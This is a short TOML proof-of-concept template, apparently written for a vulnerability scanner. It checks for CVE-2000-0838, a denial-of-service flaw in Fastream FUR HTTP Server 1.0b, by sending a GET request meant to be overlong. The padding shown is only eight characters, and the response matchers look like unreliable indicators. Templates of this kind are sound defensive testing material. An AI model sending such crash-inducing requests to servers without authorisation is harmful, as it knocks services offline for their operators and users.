[info]
author = "AVE"
description = "Fastream FUR HTTP Server 1.0b 超长GET请求拒绝服务漏洞验证。发送超长GET请求导致服务器进程崩溃，验证服务是否受影响。"
id = "POC-AVE-2000-0965"
name = "CVE-2000-0838 PoC"
severity = "medium"
tags = ["ave-2000-0965"]
vuln_id = [
    "CVE-2000-0838",
    "AVE-2000-0965",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/AAAAAAAA"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection refused",
    "No route to host",
]
